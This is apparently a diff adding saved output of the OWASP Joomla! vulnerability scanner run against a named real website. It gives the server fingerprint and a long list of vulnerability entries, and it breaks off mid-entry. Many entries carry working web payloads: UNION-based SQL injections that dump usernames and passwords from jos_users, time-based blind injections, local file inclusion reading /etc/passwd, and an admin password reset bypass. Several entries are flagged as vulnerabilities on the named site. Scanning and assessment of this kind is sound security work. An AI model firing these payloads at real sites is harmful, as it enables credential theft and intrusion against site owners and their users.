@@ -1,0 +1,639 @@
+
+
+ ..|''||   '|| '||'  '|'     |      .|'''.|  '||''|.  
+.|'    ||   '|. '|.  .'     |||     ||..  '   ||   || 
+||      ||   ||  ||  |     |  ||     ''|||.   ||...|' 
+'|.     ||    ||| |||     .''''|.  .     '||  ||      
+ ''|...|'      |   |     .|.  .||. |'....|'  .||.     
+    
+ 
+=================================================================
+OWASP Joomla! Vulnerability Scanner v0.0.4  
+(c) Aung Khant, aungkhant]at[yehg.net
+YGN Ethical Hacker Group, Myanmar, http://yehg.net/lab
+Update by: Web-Center, http://web-center.si (2011)
+=================================================================
+
+
+Vulnerability Entries: 611
+Last update: February 2, 2012
+
+Use "update" option to update the database
+Use "check" option to check the scanner update
+Use "download" option to download the scanner latest version package
+Use svn co to update the scanner and the database
+svn co https://joomscan.svn.sourceforge.net/svnroot/joomscan joomscan 
+
+
+Target: http://ceris-ingenierie.fr
+
+Server: Apache/2.2.9 (Fedora)
+X-Powered-By: PHP/5.2.6, PleskLin
+
+
+## Checking if the target has deployed an Anti-Scanner measure
+
+[!] Scanning Passed ..... OK 
+
+
+## Detecting Joomla! based Firewall ...
+    
+[!] .htaccess shipped with Joomla! is being deployed for SEO purpose
+[!] It contains some defensive mod_rewrite rules
+[!] Payloads that contain strings (mosConfig,base64_encode,<script>
+    GLOBALS,_REQUEST) wil be responsed with 403.
+
+
+## Fingerprinting in progress ...
+
+~Generic version family ....... [1.5.x]
+
+~1.5.x en-GB.ini revealed [1.5.12 - 1.5.14]
+
+* Deduced version range is : [1.5.12 - 1.5.14]
+
+## Fingerprinting done.
+
+
+## 3 Components Found in front page  ##
+
+ com_rss	 com_content	
+ com_ckforms	
+
+
+
+
+Vulnerabilities Discovered
+==========================
+
+# 1
+Info -> Generic: Unprotected Administrator directory 
+Versions Affected: Any
+Check: /administrator/
+Exploit: The default /administrator directory is detected. Attackers can bruteforce administrator accounts. Read: http://yehg.net/lab/pr0js/view.php/MULTIPLE%20TRICKY%20WAYS%20TO%20PROTECT.pdf
+Vulnerable? N/A
+
+# 2
+Info -> Core: Multiple XSS/CSRF Vulnerability 
+Versions Affected: 1.5.9 <= 
+Check: /?1.5.9-x
+Exploit: A series of XSS and CSRF faults exist in the administrator application.  Affected administrator components include com_admin, com_media, com_search.  Both com_admin and com_search contain XSS vulnerabilities, and com_media contains 2 CSRF vulnerabilities.  
+Vulnerable? No
+
+# 3
+Info -> Core: JSession SSL Session Disclosure Vulnerability 
+Versions effected: Joomla! 1.5.8 <= 
+Check: /?1.5.8-x
+Exploit: When running a site under SSL (the entire site is forced to be under ssl), Joomla! does not set the SSL flag on the cookie.  This can allow someone monitoring the network to find the cookie related to the session. 
+Vulnerable? No
+
+# 4
+Info -> Core: Frontend XSS Vulnerability 
+Versions effected: 1.5.10 <=
+Check: /?1.5.10-x
+Exploit: Some values were output from the database without being properly escaped.  Most strings in question were sourced from the administrator panel. Malicious normal admin can leverage it to gain access to super admin.
+Vulnerable? No
+
+# 5
+Info -> Core: Missing JEXEC Check - Path Disclosure Vulnerability 
+Versions effected: 1.5.11 <=
+Check: /libraries/phpxmlrpc/xmlrpcs.php
+Exploit: /libraries/phpxmlrpc/xmlrpcs.php
+Vulnerable? No
+
+# 6
+Info -> Core: Missing JEXEC Check - Path Disclosure Vulnerability 
+Versions effected: 1.5.12 <=
+Check: /libraries/joomla/utilities/compat/php50x.php
+Exploit: /libraries/joomla/utilities/compat/php50x.php
+Vulnerable? No
+
+# 7
+Info -> Core: Frontend XSS - HTTP_REFERER not properly filtered Vulnerability 
+Versions effected: 1.5.11 <=
+Check: /?1.5.11-x-http_ref
+Exploit: An attacker can inject JavaScript or DHTML code that will be executed in the context of targeted user browser, allowing the attacker to steal cookies. HTTP_REFERER variable is not properly parsed.
+Vulnerable? No
+
+# 8
+Info -> Core: Frontend XSS - PHP_SELF not properly filtered Vulnerability 
+Versions effected: 1.5.11 <=
+Check: /?1.5.11-x-php-s3lf
+Exploit: An attacker can inject JavaScript code in a URL that will be executed in the context of targeted user browser. 
+Vulnerable? No
+
+# 9
+Info -> Core: Authentication Bypass Vulnerability 
+Versions effected: Joomla! 1.5.3 <=
+Check: /administrator/
+Exploit: Backend accepts any password for custom Super Administrator when LDAP enabled
+Vulnerable? No
+
+# 10
+Info -> Core: Path Disclosure Vulnerability 
+Versions effected: Joomla! 1.5.3 <=
+Check: /?1.5.3-path-disclose
+Exploit: Crafted URL can disclose absolute path
+Vulnerable? No
+
+# 11
+Info -> Core: User redirected Spamming Vulnerability 
+Versions effected: Joomla! 1.5.3 <=
+Check: /?1.5.3-spam
+Exploit: User redirect spam
+Vulnerable? No
+
+# 12
+Info -> Core: joomla.php Remote File Inclusion Vulnerability 
+Versions effected: 1.0.0 
+Check: /includes/joomla.php
+Exploit: /includes/joomla.php?includepath=
+Vulnerable? No
+
+# 13
+Info -> Core: Admin Backend Cross Site Request Forgery Vulnerability 
+Versions effected: 1.0.13 <=
+Check: /administrator/
+Exploit: It requires an administrator to be logged in and to be tricked into a specially crafted webpage.
+Vulnerable? Yes
+
+# 14
+Info -> Core: Path Disclosure Vulnerability 
+Versions effected: Joomla! 1.5.12 <=
+Check: /libraries/joomla/utilities/compat/php50x.php
+Exploit: /libraries/joomla/utilities/compat/php50x.php
+Vulnerable? No
+
+# 15
+Info -> CorePlugin: Xstandard Editor X_CMS_LIBRARY_PATH Local Directory Traversal Vulnerability 
+Versions effected: Joomla! 1.5.8 <=
+Check: /plugins/editors/xstandard/attachmentlibrary.php
+Exploit: Submit new header X_CMS_LIBRARY_PATH with value ../ to  /plugins/editors/xstandard/attachmentlibrary.php
+Vulnerable? No
+
+# 16
+Info -> CoreTemplate: ja_purity XSS Vulnerability 
+Versions effected: 1.5.10 <=
+Check: /templates/ja_purity/
+Exploit: A XSS vulnerability exists in the JA_Purity template which ships with Joomla! 1.5.
+Vulnerable? No
+
+# 17
+Info -> CoreLibrary: phpmailer Remote Code Execution Vulnerability 
+Versions effected: Joomla! 1.5.0 Beta/Stable
+Check: /libraries/phpmailer/phpmailer.php
+Exploit: N/A
+Vulnerable? No
+
+# 18
+Info -> CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities 
+Versions effected: Joomla! 1.5.12 
+Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
+Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
+Vulnerable? Yes
+
+# 19
+Info -> CoreComponent: Joomla Remote Admin Password Change Vulnerability 
+Versions Affected: 1.5.5 <= 
+Check: /components/com_user/controller.php
+Exploit: 1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm  2. Write into field "token" char ' and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password 
+Vulnerable? No
+
+# 20
+Info -> CoreComponent: com_content SQL Injection Vulnerability 
+Version Affected: Joomla! 1.0.0 <= 
+Check: /components/com_content/
+Exploit: /index.php?option=com_content&task=blogcategory&id=60&Itemid=99999+UNION+SELECT+1,concat(0x1e,username,0x3a,password,0x1e,0x3a,usertype,0x1e),3,4,5+FROM+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--
+Vulnerable? No
+
+# 21
+Info -> CoreComponent: com_search Remote Code Execution Vulnerability 
+Version Affected: Joomla! 1.5.0 beta 2 <= 
+Check: /components/com_search/
+Exploit: /index.php?option=com_search&Itemid=1&searchword=%22%3Becho%20md5(911)%3B
+Vulnerable? No
+
+# 22
+Info -> CoreComponent: com_admin File Inclusion Vulnerability 
+Versions Affected: N/A
+Check: /administrator/components/com_admin/admin.admin.html.php
+Exploit: /administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=
+Vulnerable? No
+
+# 23
+Info -> CoreComponent: MailTo SQL Injection Vulnerability 
+Versions effected: N/A
+Check: /components/com_mailto/
+Exploit: /index.php?option=com_mailto&tmpl=mailto&article=550513+and+1=2+union+select+concat(username,char(58),password)+from+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--&Itemid=1
+Vulnerable? No
+
+# 24
+Info -> CoreComponent: com_content Blind SQL Injection Vulnerability 
+Versions effected: Joomla! 1.5.0 RC3
+Check: /components/com_content/
+Exploit: /index.php?option=com_content&view=%' +'a'='a&id=25&Itemid=28
+Vulnerable? No
+
+# 25
+Info -> CoreComponent: com_content XSS Vulnerability 
+Version Affected: Joomla! 1.5.7 <= 
+Check: /components/com_content/
+Exploit: The defaults on com_content article submission allow entry of dangerous HTML tags (script, etc).  This only affects users with access level Author or higher, and only if you have not set filtering options in com_content configuration. 
+Vulnerable? No
+
+# 26
+Info -> CoreComponent: com_weblinks XSS Vulnerability 
+Version Affected: Joomla! 1.5.7 <= 
+Check: /components/com_weblinks/
+Exploit: [Requires valid user account] com_weblinks allows raw HTML into the title and description tags for weblink submissions (from both the administrator and site submission forms). 
+Vulnerable? No
+
+# 27
+Info -> CoreComponent: com_mailto Email Spam Vulnerability 
+Version Affected: Joomla! 1.5.6 <= 
+Check: /components/com_mailto/
+Exploit: The mailto component does not verify validity of the URL prior to sending.
+Vulnerable? No
+
+# 28
+Info -> CoreComponent: com_content view=archive SQL Injection Vulnerability 
+Versions effected: Joomla! 1.5.0 Beta1/Beta2/RC1
+Check: /components/com_content/
+Exploit: Unfiltered POST vars - filter, month, year  to /index.php?option=com_content&view=archive
+Vulnerable? No
+
+# 29
+Info -> CoreComponent: com_content XSS Vulnerability 
+Version Affected: Joomla! 1.5.9 <=
+Check: /components/com_content/
+Exploit: A XSS vulnerability exists in the category view of com_content. 
+Vulnerable? No
+
+# 30
+Info -> CoreComponent: com_installer CSRF Vulnerability 
+Versions effected: Joomla! 1.5.0 Beta
+Check: /administrator/components/com_installer/
+Exploit: N/A
+Vulnerable? No
+
+# 31
+Info -> CoreComponent: com_search Memory Comsumption DoS Vulnerability 
+Versions effected: Joomla! 1.5.0 Beta
+Check: /components/com_search/
+Exploit: N/A
+Vulnerable? No
+
+# 32
+Info -> CoreComponent: com_poll (mosmsg) Memory Consumption DOS Vulnerability 
+Versions effected: 1.0.7 <=
+Check: /components/com_poll/
+Exploit: Send request  /index.php?option=com_poll&task=results&id=14&mosmsg=DOS@HERE<<>AAA<><>
+Vulnerable? No
+
+# 33
+Info -> CoreComponent: com_banners Blind SQL Injection Vulnerability 
+Versions effected: N/A
+Check: /components/com_banners/
+Exploit: /index.php?option=com_banners&task=archivesection&id=0'+and+'1'='1::/index.php?option=com_banners&task=archivesection&id=0'+and+'1'='2
+Vulnerable? Yes
+
+# 34
+Info -> CoreComponent: com_mailto timeout Vulnerability 
+Versions effected: 1.5.13 <=
+Check: /components/com_mailto/
+Exploit: [Requires a valid user account] In com_mailto, it was possible to bypass timeout protection against sending automated emails.
+Vulnerable? Yes
+
+# 35
+Info -> Component: JCE XSS+File Inclusion Vulnerability	
+Versions Affected: 1.0.4<= 
+Check: /components/com_jce/
+Exploit: 1) Input passed to the "img", "title", "w", and "h" parameters within jce.php is not properly sanitised before being returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site.  2) Input passed to the "plugin" and "file" parameters within jce.php is not properly verified before being used to include files. This can be exploited to include arbitrary files from local resources. 
+Vulnerable? No
+
+# 36
+Info -> Component: Dada Mail Manager Component Remote File Inclusion Vulnerability 
+Version Affected: 2.6 <= 
+Check: /administrator/components/
+Exploit: /administrator/components/com_dadamail/config.dadamail.php?GLOBALS[mosConfig_absolute_path]=
+Vulnerable? No
+
+# 37
+Info -> Component: JS Calendar 1.5.1 Joomla Component Multiple Remote Vulnerabilities: SQL Injection 
+Versions Affected: 1.5.1 
+Check: /index.php?option=com_jscalendar&view=jscalendar&task=details&ev_id=999UNIONSELECT1,username,password,4,5,6,7,8FROMjos_users
+Exploit: /index.php?option=com_jscalendar&view=jscalendar&task=details&ev_id=999 UNION SELECT 1,username,password,4,5,6,7,8 FROM jos_users
+Vulnerable? No
+
+# 38
+Info -> Component: JE Guestbook 1.0 Joomla Component Multiple Remote Vulnerabilities: SQL Injection 
+Versions Affected: 1.0 
+Check: /index.php?option=com_jeguestbook&view=item_detail&d_itemid=-1OR(SELECT(IF(0x41=0x41,BENCHMARK(999999999,NULL),NULL)))
+Exploit: /index.php?option=com_jeguestbook&view=item_detail&d_itemid=-1 OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999,NULL),NULL)))
+Vulnerable? No
+
+# 39
+Info -> Component: Joomla Component (com_elite_experts) SQL Injection 
+Versions Affected: "any" 
+Check: /index.php?option=com_elite_experts&task=showExpertProfileDetailed&getExpertsFromCountry=&language=ru&id=
+Exploit: /index.php?option=com_elite_experts&task=showExpertProfileDetailed&getExpertsFromCountry=&language=ru&id=
+Vulnerable? No
+
+# 40
+Info -> Component: JComponent com_ezautos SQL Injection 
+Versions Affected: "any"
+Check: /index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode=1
+Exploit: /index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode=1
+Vulnerable? No
+
+# 41
+Info -> Component: TimeTrack SQL Injection 
+Versions Affected: 1.2.4
+Check: /index.php?option=com_timetrack&view=timetrack&ct_id=-1UNIONSELECT1,2,3,4,5,6,7,8,9,10,11,CONCAT(username,0x3A,password)FROMjos_users
+Exploit: /index.php?option=com_timetrack&view=timetrack&ct_id=-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,CONCAT(username,0x3A,password) FROM jos_users
+Vulnerable? No
+
+# 42
+Info -> Component: Joomla JGen Component SQL Injection 
+Versions Affected: "any" 
+Check: /index.php?option=com_jgen&task=view&id=
+Exploit: /index.php?option=com_jgen&task=view&id=
+Vulnerable? No
+
+# 43
+Info -> Component: Joomla Component Aardvertiser SQL Injection 
+Versions Affected: 2.1 
+Check: /index.php?option=com_aardvertiser&cat_name=Vehicles'+AND+'1'='1&task=view
+Exploit: /index.php?option=com_aardvertiser&cat_name=Vehicles'+AND+'1'='1&task=view
+Vulnerable? No
+
+# 44
+Info -> Component: Joomla Component Clantools SQL Injection 
+Versions Affected: 1.2.3 
+Check: /index.php?option=com_clantools&squad=1+
+Exploit: /index.php?option=com_clantools&squad=1+
+Vulnerable? No
+
+# 45
+Info -> Component: Joomla Component Clantools SQL Injection 
+Versions Affected: 1.2.3 
+Check: /index.php?option=com_clantools&task=clanwar&showgame=1+
+Exploit: /index.php?option=com_clantools&task=clanwar&showgame=1+
+Vulnerable? No
+
+# 46
+Info -> Component: Joomla Component Clantools SQL Injection 
+Versions Affected: 1.5 
+Check: /index.php?option=com_clantools&squad=1+
+Exploit: /index.php?option=com_clantools&squad=1+
+Vulnerable? No
+
+# 47
+Info -> Component: Joomla Component JE Pro SQL Injection 
+Versions Affected: 1.5.0 
+Check: /index.php?option=com_jefaqpro&view=category&layout=categorylist&catid=2
+Exploit: /index.php?option=com_jefaqpro&view=category&layout=categorylist&catid=2
+Vulnerable? No
+
+# 48
+Info -> Component: Joomla Component JE Pro SQL Injection 
+Versions Affected: 1.5.0 
+Check: /index.php?option=com_jefaqpro&view=category&layout=categorylist&task=lists&catid=2
+Exploit: /index.php?option=com_jefaqpro&view=category&layout=categorylist&task=lists&catid=2
+Vulnerable? No
+
+# 49
+Info -> Component: PhotoMap Gallery SQL Injection 
+Versions Affected: 1.6.0 
+Check: /index.php?option=com_photomapgallery&view=imagehandler&folder=-1OR(SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+Exploit: /index.php?option=com_photomapgallery&view=imagehandler&folder=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+Vulnerable? No
+
+# 50
+Info -> Component: JComponent Zoom Portfolio SQL Injection 
+Versions Affected: 1.5 
+Check: /index.php?option=com_zoomportfolio&view=portfolio&view=portfolio&id=
+Exploit: /index.php?option=com_zoomportfolio&view=portfolio&view=portfolio&id=
+Vulnerable? No
+
+# 51
+Info -> Component: Biblioteca SQL Injection 
+Versions Affected: 1.0 Beta 
+Check: /index.php?option=com_biblioteca&view=biblioteca&testo=-a%25'UNIONSELECT1,username,password,4,5,6,7,8,9FROMjos_users%23
+Exploit: /index.php?option=com_biblioteca&view=biblioteca&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23
+Vulnerable? No
+
+# 52
+Info -> Component: Joomla Component com_zina SQL Injection 
+Versions Affected: 2.x 
+Check: /index.php?option=com_zina&view=zina&Itemid=9
+Exploit: /index.php?option=com_zina&view=zina&Itemid=9
+Vulnerable? No
+
+# 53
+Info -> Component: JComponent (com_ongallery) SQL Injection 
+Versions Affected: "Any" 
+Check: /index.php?option=com_ongallery&task=ft&id=-1+order+by+1--
+Exploit: /index.php?option=com_ongallery&task=ft&id=-1+order+by+1--
+Vulnerable? No
+
+# 54
+Info -> Component: Joomla "com_equipment" Sql Injection 
+Versions Affected: "Any" 
+Check: /index.php?option=com_equipment&view=details&id=
+Exploit: /index.php?option=com_equipment&view=details&id=
+Vulnerable? No
+
+# 55
+Info -> Component: Joomla "com_equipment" Sql Injection 
+Versions Affected: "Any" 
+Check: /index.php?option=com_equipment&task=components&id=45&sec_men_id=
+Exploit: /index.php?option=com_equipment&task=components&id=45&sec_men_id=
+Vulnerable? No
+
+# 56
+Info -> Component: Amblog SQL Injection 
+Versions Affected: 1.0 
+Check: /index.php?option=com_amblog&view=amblog&catid=-1UNIONSELECT@@version
+Exploit: /index.php?option=com_amblog&view=amblog&catid=-1 UNION SELECT @@version
+Vulnerable? No
+
+# 57
+Info -> Component: JComponent (com_yellowpages) SQL Injection 
+Versions Affected: "Any" 
+Check: /index.php?option=com_yellowpages&cat=-1923+UNION+SELECT1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37+from+jos_users--+Union+select+user()+from+jos_users--
+Exploit: /index.php?option=com_yellowpages&cat=-1923+UNION+SELECT 1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37+from+jos_users--+Union+select+user()+from+jos_users--
+Vulnerable? No
+
+# 58
+Info -> Component: JComponent com_neorecruit SQL Injection 
+Versions Affected: 1.4 
+Check: /index.php?option=com_neorecruit&task=offer_view&id=
+Exploit: /index.php?option=com_neorecruit&task=offer_view&id=
+Vulnerable? No
+
+# 59
+Info -> Component: JComponent (com_camelcitydb2) SQL Injection 
+Versions Affected: All version 
+Check: /index.php?option=com_camelcitydb2&id=-3+union+select+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11+from+jos_users--
+Exploit: /index.php?option=com_camelcitydb2&id=-3+union+select+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11+from+jos_users--
+Vulnerable? No
+
+# 60
+Info -> Component: Spielothek SQL Injection 
+Versions Affected: 1.6.9 
+Check: /index.php?option=com_spielothek&task=savebattle&bid=-1OR(SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+Exploit: /index.php?option=com_spielothek&task=savebattle&bid=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+Vulnerable? No
+
+# 61
+Info -> Component: Spielothek SQL Injection 
+Versions Affected: 1.6.9 
+Check: /index.php?option=com_spielothek&view=battle&wtbattle=play&bid=-1OR(SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+Exploit: /index.php?option=com_spielothek&view=battle&wtbattle=play&bid=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+Vulnerable? No
+
+# 62
+Info -> Component: Spielothek SQL Injection 
+Versions Affected: 1.6.9 
+Check: /index.php?option=com_spielothek&view=battle&wtbattle=ddbdelete&dbtable=vS&loeschen[0]=-1OR(SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+Exploit: /index.php?option=com_spielothek&view=battle&wtbattle=ddbdelete&dbtable=vS&loeschen[0]=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
+Vulnerable? No
+
+# 63
+Info -> Component: Joomla "com_beamospetition" Sql Injection 
+Versions Affected: "All" 
+Check: /index.php?option=com_beamospetition&startpage=3&pet=-1
+Exploit: /index.php?option=com_beamospetition&startpage=3&pet=-1
+Vulnerable? No
+
+# 64
+Info -> +Union+select+user()+from+jos_users--|/index.php?option=com_beamospetition&startpage=3&pet=-1+Union+select+user()+from+jos_users--
+
+Check: /index.php?option=com_beamospetition&startpage=3&pet=-1+Union+select+user()+from+jos_users--
+Exploit: /index.php?option=com_beamospetition&startpage=3&pet=-1+Union+select+user()+from+jos_users--
+Vulnerable? N/A
+
+# 65
+Info -> Component: Joomla Component (com_simpleshop) SQL Injection 
+Versions Affected: "any" 
+Check: /index.php?option=com_simpleshop&Itemid=26&task=viewprod&id=-999.9UNIONSELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,concat(username,0x3e,password,0x3e,usertype,0x3e,lastvisitdate)+from+jos_users--
+Exploit: /index.php?option=com_simpleshop&Itemid=26&task=viewprod&id=-999.9 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,concat(username,0x3e,password,0x3e,usertype,0x3e,lastvisitdate)+from+jos_users--
+Vulnerable? No
+
+# 66
+Info -> Component: PBBooking SQL Injection 
+Versions Affected: 1.0.4_3
+Check: /index.php?option=com_pbbooking&task=validate&id=-1OR(SELECT(IF(0x41=0x41,BENCHMARK(999999999,NULL),NULL)))
+Exploit: /index.php?option=com_pbbooking&task=validate&id=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(999999999,NULL),NULL)))
+Vulnerable? No
+
+# 67
+Info -> Component: Joomla "com_youtube" Sql Injection Vulnerability 
+Versions Affected: 1.5 
+Check: /index.php?option=com_youtube&id_cate=4
+Exploit: /index.php?option=com_youtube&id_cate=4
+Vulnerable? No
+
+# 68
+Info -> Component: Joomla Component Joomdle SQL vulnerability 
+Versions Affected: 0.24 or lower ;) 
+Check: /index.php?option=com_joomdle&view=detail&cat_id=1&course_id=
+Exploit: /index.php?option=com_joomdle&view=detail&cat_id=1&course_id=
+Vulnerable? N/A
+
+# 69
+Info -> Component: Joomla Component (com_oziogallery) SQL Injection 
+Versions Affected: Any 
+Check: /index.php?option=com_oziogallery&Itemid=
+Exploit: /index.php?option=com_oziogallery&Itemid=
+Vulnerable? No
+
+# 70
+Info -> Component: Joomla Component com_iproperty SQL Injection Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_iproperty&view=agentproperties&id=
+Exploit: /index.php?option=com_iproperty&view=agentproperties&id=-999999/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,group_concat(username,char(58),password)v3n0m/**/from/**/jos_users-
+Vulnerable? No
+
+# 71
+Info -> Component: Joomla Component com_huruhelpdesk SQL Injection Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_huruhelpdesk&view=detail&cid[0]=
+Exploit: /index.php?option=com_huruhelpdesk&view=detail&cid[0]=-1/**/union/**/select/**/1,2,3,concat%28username,0x3a,password%29,5,6,7+from+jos_users--
+Vulnerable? No
+
+# 72
+Info -> Component: Joomla Component (com_staticxt) SQL Injection Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_staticxt&staticfile=test.php&id=1923
+Exploit: /index.php?option=com_staticxt&staticfile=test.php&id=-1923+union select+concat_ws(0x3a,username,password),2,3,4,5,6,7,8,9,10,11,12+from+jos_users
+Vulnerable? No
+
+# 73
+Info -> Component: Joomla Component (com_spa) SQL Injection Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_spa&view=spa_product&cid=
+Exploit: /index.php?option=com_spa&view=spa_product&cid=-1+union+select concat(username,0x3a,password)+from+jos_users
+Vulnerable? No
+
+# 74
+Info -> Component: Joomla Component com_jomtube (user_id) Blind SQL Injection / SQL Injection 
+Versions Affected: Any 
+Check: /index.php?view=videos&type=member&user_id=-62+union+select+1,2,3,4,5,6,7,8,9,10,11,12,group_concat(username,0x3a,password),14,15,16,17,18,19,20,21,22,23,24,25,26,27+from+jos_users--&option=com_jomtube
+Exploit: /index.php?view=videos&type=member&user_id=-62+union+select+1,2,3,4,5,6,7,8,9,10,11,12,group_concat(username,0x3a,password),14,15,16,17,18,19,20,21,22,23,24,25,26,27+from+jos_users--&option=com_jomtube
+Vulnerable? No
+
+# 75
+Info -> Component: Joomla Component com_golfcourseguide SQL Injection Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_golfcourseguide&view=golfcourses&cid=1&id=
+Exploit: /index.php?option=com_golfcourseguide&view=golfcourses&cid=1&id=
+Vulnerable? No
+
+# 76
+Info -> Component: Joomla com_myhome BSQLi Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_myhome&task=4&nidimmindex.php?option=com_myhome&task=4&nidimm=
+Exploit: /index.php?option=com_myhome&task=4&nidimmindex.php?option=com_myhome&task=4&nidimm=
+Vulnerable? N/A
+
+# 77
+Info -> Component: Joomla Component QContacts (com_qcontacts) - SQL Injection Vulnerability 
+Versions Affected: 1.0.4 and previous 
+Check: /index.php?option=com_qcontacts&Itemid=1'
+Exploit: /index.php?option=com_qcontacts&Itemid=1'
+Vulnerable? No
+
+# 78
+Info -> Component: Joomla Component Seyret (com_seyret) - Local File Inclusion Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_seyret&view=
+Exploit: /index.php?option=com_seyret&view=
+Vulnerable? No
+
+# 79
+Info -> Component: Joomla Phoca Gallery Component (com_phocagallery) SQL Injection Vulnerability 
+Versions Affected: v2.7.3 
+Check: /index.php?option=com_phocagallery&view=categories&Itemid=
+Exploit: /index.php?option=com_phocagallery&view=categories&Itemid=
+Vulnerable? No
+
+# 80
+Info -> Component: Joomla Component (com_obSuggest) Local File Inclusion Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_obsuggest&controller=
+Exploit: /index.php?option=com_obsuggest&controller=
+Vulnerable? No
+
+# 81
+Info -> Component: Joomla Component Matamko Local File Inclusion Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_matamko&controller=
+Exploit: /index.php?option=com_matamko&controller=../../../../../../../../../../etc/passwd%00
+Vulnerable? No
+
+# 82
+Info -> Component: Joomla Component com_iproperty 1.5.3 (id) SQL Injection Vulnerability 
+Versions Affected: Any 
+Check: /index.php?option=com_iproperty&view=agentpr
